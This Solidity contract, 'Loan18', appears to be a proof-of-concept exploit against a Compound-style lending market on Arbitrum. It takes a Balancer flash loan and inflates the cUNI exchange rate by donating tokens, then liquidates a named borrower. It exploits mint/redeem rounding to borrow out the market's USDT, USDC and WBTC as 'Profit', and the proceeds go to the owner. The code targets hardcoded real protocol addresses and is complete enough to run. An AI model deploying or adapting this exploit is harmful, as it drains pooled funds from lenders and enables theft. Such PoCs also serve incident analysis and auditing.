// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";

import "./IBalancer.sol";
import "./IFlashLoanRecipient.sol";
import "./IOracle.sol";
import "./ICToken.sol";
import "./IComptroller.sol";

import "./IUniswapV2Router.sol";

import "./console.sol";

// Channels Arbi
contract Loan18 is IFlashLoanRecipient {
    IBalancer constant vault = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Router constant router = IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); // sushi router

    IComptroller constant tenderComp = IComptroller(0xeed247Ba513A8D6f78BE9318399f5eD1a4808F8e);
    ICToken constant tUNI = ICToken(0x8b44D3D286C64C8aAA5d445cFAbF7a6F4e2B3A71);
    ICToken constant tUSDC = ICToken(0x068485a0f964B4c3D395059a19A05a8741c48B4E);

    IComptroller constant comptroller = IComptroller(0x3C13b172bf8BE5b873EB38553feC50F78c826284);
    IOracle constant oracle = IOracle(0x1d47F4A95Db7A3fC4141b5386AB06fde6367fd12);
    ICToken constant cUNI = ICToken(0xaB06f920da5C07c184cd39D2f9907D788654013E); // Collateral Factor 60%
    ICToken constant cUSDT = ICToken(0x92F6AA3d3d4b46f5e99a26984B4112c7Faa0C96c);
    ICToken constant cUSDC = ICToken(0xce8Fa238383bC3036aBE3410D7D630C7692Eb6D7);
    ICToken constant cWETH = ICToken(0x0Ddf298FB7fd115fddB714EB722F8be5Dc238C78);
    ICToken constant cWBTC = ICToken(0x1b1740085C04286a318ae47400a3561b890979C7);
    IERC20 constant UNI = IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
    IERC20 constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    address constant borrower = 0xD1edDE2FFAC4bc901b7E7a817Af126C2Ef332a27;
    address immutable owner;

    error PriceNotDefined(uint price);

    constructor() {
        owner = msg.sender;
    }

    function start(address[] memory tokens, uint256[] memory amounts) external {
        // console.log('BlockNumber:', block.number);
        vault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, new bytes(0));
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory amounts, uint256[] memory, bytes memory) external {
        // Borrow UNI(ARB) from Tender Finance
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(tUSDC);
        tenderComp.enterMarkets(cTokens);

        USDC.approve(address(tUSDC), type(uint).max);
        tUSDC.mint(1e6 * 100000);
        tUNI.borrow(1e18 * 4500);

        uint uniPrice = oracle.getUnderlyingPrice(address(cUNI));
        uint usdcPrice = oracle.getUnderlyingPrice(address(cUSDC));

        console.log(cUNI.totalReserves());

        cUNI.accrueInterest();
        cUSDC.accrueInterest();

        uint exR = ((cUSDC.borrowBalanceStored(borrower) / 2) *
            usdcPrice *
            comptroller.liquidationIncentiveMantissa()) /
            uniPrice /
            cUNI.balanceOf(borrower);
        console.log('Ex:', exR);

        console.log(
            (exR * cUNI.totalSupply()) / 1e18,
            cUNI.totalReserves(),
            cUNI.totalBorrows(),
            UNI.balanceOf(address(cUNI))
        );
        uint transferAmount = ((exR * cUNI.totalSupply()) / 1e18) +
            cUNI.totalReserves() -
            cUNI.totalBorrows() -
            UNI.balanceOf(address(cUNI));
        console.log('TransferAmount:', transferAmount);

        UNI.transfer(address(cUNI), transferAmount);
        cUNI.accrueInterest();

        USDC.approve(address(cUSDC), type(uint).max);
        cUSDC.liquidateBorrow(borrower, cUSDC.borrowBalanceStored(borrower) / 2, address(cUNI));
        console.log('Left cUNI Bal:', cUNI.balanceOf(borrower));

        UNI.approve(address(cUNI), type(uint).max);
        cUNI.repayBorrowBehalf(borrower, cUNI.borrowBalanceStored(borrower));
        uint delta = cUNI.totalBorrows() - cUNI.totalReserves();
        cUNI.repayBorrowBehalf(0xFF16d64179A02D6a56a1183A28f1D6293646E2dd, delta);
        cUNI.redeem(cUNI.balanceOf(address(this)));

        cTokens[0] = address(cUNI);
        comptroller.enterMarkets(cTokens);

        // Prepare cUNI Collateral
        UNI.transfer(address(cUNI), 1);
        uint uniBal = UNI.balanceOf(address(this));
        cUNI.mint(uniBal);
        cUNI.redeem(cUNI.balanceOf(address(this)) - 2);
        UNI.transfer(address(cUNI), UNI.balanceOf(address(this)));

        // Borrow USDT, USDC, WBTC (Profit)
        USDT.transfer(address(cUSDT), 100e6);
        cUSDT.borrow(USDT.balanceOf(address(cUSDT)));
        cUSDC.borrow(USDC.balanceOf(address(cUSDC)));
        cWBTC.borrow(0.035e8);
        cUNI.redeemUnderlying(uniBal);

        // Redeem USDC from Tender
        UNI.approve(address(tUNI), type(uint).max);
        tUNI.repayBorrow(1e18 * 4500);
        tUSDC.redeemUnderlying(1e6 * 100000);

        // Swap USDT, WBTC to USDC
        address[] memory path = new address[](3);
        path[0] = address(USDT);
        path[1] = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1; // WETH
        path[2] = address(USDC);

        USDT.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)) - amounts[0],
            0,
            path,
            address(this),
            block.timestamp + 100
        );

        path[0] = address(WBTC);
        WBTC.approve(address(router), type(uint).max);
        router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 100);

        // Repay Loan
        USDT.transfer(address(vault), amounts[0]);
        USDC.transfer(address(vault), amounts[1]);

        // Withdraw
        USDC.transfer(owner, USDC.balanceOf(address(this)));
    }
}

